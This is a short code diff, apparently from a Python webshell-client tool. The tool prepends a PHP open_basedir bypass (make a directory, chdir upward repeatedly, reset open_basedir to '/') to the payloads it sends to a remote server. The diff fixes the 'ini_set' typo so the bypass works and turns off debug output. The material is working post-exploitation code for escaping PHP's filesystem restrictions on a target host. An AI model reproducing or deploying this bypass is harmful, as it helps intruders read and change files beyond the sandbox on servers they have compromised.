@@ -100,7 +100,7 @@ if($r === false){
 die('bypass opendir failed!');}
 else{$dir=$ndir;}}
 chdir($dir);
-ni_set("open_basedir","..");
+ini_set("open_basedir","..");
 $c=substr_count(getcwd(), "/");
 for($i=0;$i<$c;$i++) chdir("..");
 ini_set("open_basedir", "/");chdir($cwd);rmdir($ndir);""" % (uuid4()) + data
@@ -142,7 +142,7 @@ ini_set("open_basedir", "/");chdir($cwd);rmdir($ndir);""" % (uuid4()) + data
         req.r_json = json.loads(req.r_text)
     except json.JSONDecodeError:
         req.r_json = ''
-    if 1:  # DEBUG
+    if 0:  # DEBUG
         print(f"[debug] {params_dict}")
         print(f"[debug] {url}")
         print(f"[debug] [{req}] [len:{len(content)}] {text}")
